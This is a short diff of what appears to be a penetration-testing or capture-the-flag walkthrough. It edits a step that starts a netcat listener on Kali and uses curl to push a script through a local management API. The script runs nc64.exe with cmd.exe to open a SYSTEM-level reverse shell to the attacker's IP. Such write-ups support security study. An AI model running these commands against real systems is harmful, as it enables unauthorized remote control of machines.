@@ -358,7 +358,9 @@ Start nc listener on Kali:
 nc -lvnp 9001
 ```
 
-Run the command below to get a shell as system:
+Now we will create a script and schedule it through the API.
+
+Run the commands below to get a shell as system:
 
 ```shell
 curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/pwn.dat --data-binary "C:\Windows\Temp\nc64.exe 10.10.14.206 9001 -e cmd.exe"
